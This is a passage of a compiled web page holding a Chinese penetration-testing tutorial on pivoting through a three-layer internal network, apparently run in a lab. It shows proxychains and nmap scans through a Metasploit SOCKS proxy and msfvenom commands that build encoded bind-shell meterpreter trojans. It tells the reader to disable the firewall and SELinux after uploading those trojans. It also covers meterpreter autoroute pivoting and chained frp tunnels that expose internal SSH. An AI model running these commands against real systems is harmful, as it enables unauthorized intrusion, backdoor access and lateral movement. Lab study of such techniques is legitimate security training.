<span class="token comment"># defaults set to &quot;tor&quot;</span>
socks5  <span class="token number">127.0</span>.0.1 <span class="token number">1080</span>

<span class="token number">8</span>.运行代理
msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job <span class="token number">4</span>.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the SOCKS proxy server
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopping the SOCKS proxy server

<span class="token number">9</span>.由于proxychains只对tcp流量有效，所以udp和icmp都是不能代理转发的。
使用namp进行扫描，nmap通过socks代理进行扫描，必须加上 -sT、-Pn两个参数
<span class="token comment"># proxychains nmap -sT -Pn 192.168.20.0/24</span>
<span class="token comment"># proxychains nmap -sT -Pn 192.168.20.0/24 -p 80</span>


<span class="token number">10</span>.使用msf来探测该20网段存活主机
use auxiliary/scanner/portscan/tcp
<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.20.0/24

<span class="token number">11</span>.扫描该主机
<span class="token comment"># proxychains nmap -sT -Pn 192.168.20.2</span>
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.20.2
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.012s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">993</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
PORT     STATE SERVICE
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
<span class="token number">135</span>/tcp  <span class="token function">open</span>  msrpc
<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn
<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds
<span class="token number">3389</span>/tcp <span class="token function">open</span>  ms-wbt-server
<span class="token number">8081</span>/tcp <span class="token function">open</span>  blackice-icecap
<span class="token number">8082</span>/tcp <span class="token function">open</span>  blackice-alerts

<span class="token number">12</span>.kail生成正向连接的木马，并配置正向连接。上传到靶机后一定要777权限，关防火墙和selinux。
<span class="token comment"># msfvenom -a x86 --platform Windows -p windows/meterpreter/bind_tcp LPORT=7777 -e x86/shikata_ga_nai -b &#39;\\x00\\x0a\\xff&#39; -i 10 -f exe &gt; payload2.exe</span>
<span class="token comment"># msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp LPORT=7777 -e x86/shikata_ga_nai -b &#39;\\x00\\x0a\\xff&#39; -i 10 -f elf &gt; payload.elf</span>
msfvenom <span class="token parameter variable">-p</span> linux/x86/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">7777</span> <span class="token parameter variable">-f</span> elf <span class="token operator">&gt;</span> <span class="token number">7777</span>

<span class="token comment"># use exploit/multi/handler</span>
<span class="token comment"># set payload windows/meterpreter/bind_tcp</span>
<span class="token comment"># set payload linux/x86/meterpreter/bind_tcp</span>

msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 

Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options <span class="token punctuation">(</span>linux/x86/meterpreter/bind_tcp<span class="token punctuation">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  <span class="token number">7777</span>             <span class="token function">yes</span>       The listen port
   RHOST  <span class="token number">192.168</span>.20.2     no        The target address


Exploit target:

   Id  Name
   --  ----
   <span class="token number">0</span>   Wildcard Target

<span class="token number">13</span>.想办法执行kail生成的正向连接的木马，然后上线。

<span class="token number">14</span>.linux上线后检查网卡
meterpreter <span class="token operator">&gt;</span> run get_local_subnets 

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
Local subnet: <span class="token number">192.168</span>.10.0/255.255.255.0
Local subnet: <span class="token number">192.168</span>.20.0/255.255.255.0

<span class="token number">15</span>.写静态路由
meterpreter <span class="token operator">&gt;</span> run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.10.0/24

<span class="token number">16</span>.使用msf来探测该10网段存活主机
use auxiliary/scanner/portscan/tcp
<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.10.0/24

<span class="token number">17</span>.kail再次生成正向连接的木马，并配置正向连接。上传到靶机后一定要777权限，关防火墙和selinux。
<span class="token comment"># msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=8888 -f elf &gt; 8888</span>
<span class="token comment"># use exploit/multi/handler</span>
<span class="token comment"># set payload linux/x86/meterpreter/bind_tcp</span>

<span class="token number">18</span>.通过msf的代理成功穿越三层网络。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="通过frp代理实现三层网络穿透" tabindex="-1"><a class="header-anchor" href="#通过frp代理实现三层网络穿透" aria-hidden="true">#</a> 通过frp代理实现三层网络穿透</h3><h4 id="实现ssh访问" tabindex="-1"><a class="header-anchor" href="#实现ssh访问" aria-hidden="true">#</a> 实现ssh访问</h4><img src="`+v+`"><h5 id="vps端配置-代理服务器" tabindex="-1"><a class="header-anchor" href="#vps端配置-代理服务器" aria-hidden="true">#</a> VPS端配置（代理服务器）</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>关闭防火墙SElinux，chmod <span class="token number">777</span> frps

<span class="token number">1</span>.编辑vim frps.ini 
<span class="token punctuation">[</span>common<span class="token punctuation">]</span>
bind_port <span class="token operator">=</span> <span class="token number">7000</span> <span class="token comment">#将服务器端口配置成7000</span>

<span class="token number">2</span>.启动服务
./frps 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="既是vps的客户端又是centos2的服务器的配置-centos1" tabindex="-1"><a class="header-anchor" href="#既是vps的客户端又是centos2的服务器的配置-centos1" aria-hidden="true">#</a> 既是VPS的客户端又是Centos2的服务器的配置（Centos1）</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.编辑vim frps.ini
<span class="token punctuation">[</span>common<span class="token punctuation">]</span>
bind_port <span class="token operator">=</span> <span class="token number">7000</span>


<span class="token number">2</span>.编辑vim frpc.ini 
<span class="token punctuation">[</span>common<span class="token punctuation">]</span>
server_addr <span class="token operator">=</span> <span class="token number">192.168</span>.20.1 <span class="token comment">#修改为VPS的IP</span>
server_port <span class="token operator">=</span> <span class="token number">7000</span> <span class="token comment">#修改为和VPS对应的端口</span>

<span class="token punctuation">[</span>centos1<span class="token punctuation">]</span>
<span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp
local_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1 <span class="token comment">#本地IP</span>
local_port <span class="token operator">=</span> <span class="token number">22</span>		<span class="token comment">#开放给kail访问的端口</span>
remote_port <span class="token operator">=</span> <span class="token number">6000</span>	<span class="token comment">#kail所连接的端口</span>

<span class="token punctuation">[</span>centos2<span class="token punctuation">]</span>
<span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp
local_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1 <span class="token comment">#本地IP</span>
local_port <span class="token operator">=</span> <span class="token number">5000</span> <span class="token comment">#此端口为Centos2开放的端口</span>
remote_port <span class="token operator">=</span> <span class="token number">4000</span> <span class="token comment">#此端口是开放给kail访问的端口</span>

<span class="token number">3</span>.启动服务
./frps
./frpc
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="centos1下的客户端配置-centos2" tabindex="-1"><a class="header-anchor" href="#centos1下的客户端配置-centos2" aria-hidden="true">#</a> Centos1下的客户端配置（Centos2）</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.编辑vim frpc.ini 
<span class="token punctuation">[</span>common<span class="token punctuation">]</span>
server_addr <span class="token operator">=</span> <span class="token number">192.168</span>.10.1 <span class="token comment">#Centos1的IP地址</span>
server_port <span class="token operator">=</span> <span class="token number">7000</span> <span class="token comment">#修改为和centos1对应的端口</span>

<span class="token punctuation">[</span>ssh<span class="token punctuation">]</span>
<span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp
local_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1 <span class="token comment">#本地IP</span>
local_port <span class="token operator">=</span> <span class="token number">22</span> 	<span class="token comment">#开放给Centos1访问的端口</span>
remote_port <span class="token operator">=</span> <span class="token number">5000</span> 	<span class="token comment">#Centos1所连接的端口</span>

<span class="token number">2</span>.启动服务
./frpc
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="kail连接" tabindex="-1"><a class="header-anchor" href="#kail连接" aria-hidden="true">#</a> kail连接</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.ssh <span class="token parameter variable">-oPort</span><span class="token operator">=</span><span class="token number">6000</span> root@192.168.0.120 <span class="token comment">#6000为客户端（Centos1）所配置的端口，ip地址为VPS的IP，最后访问的是客户端（Centos1）。</span>
<span class="token number">2</span>.ssh <span class="token parameter variable">-oPort</span><span class="token operator">=</span><span class="token number">4000</span> root@192.168.0.120 <span class="token comment">#6000为客户端（Centos2）所配置的端口，ip地址为VPS的IP，最后访问的是客户端（Centos2）。</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,17);function w(y,S){const e=r("ExternalLinkIcon");return p(),t("div",null,[b,n("ul",null,[k,n("li",null,[n("p",null,[n("a",h,[s("https://github.com/besimorhino/powercat"),l(e)])])])]),g,n("ul",null,[x,f,n("li",null,[n("p",null,[s("服务器：EarthWorm（"),n("a",_,[s("https://github.com/idlefire/ew）"),l(e)])])])]),P])}const C=i(m,[["render",w],["__file","内网代理.html.vue"]]);export{C as default};
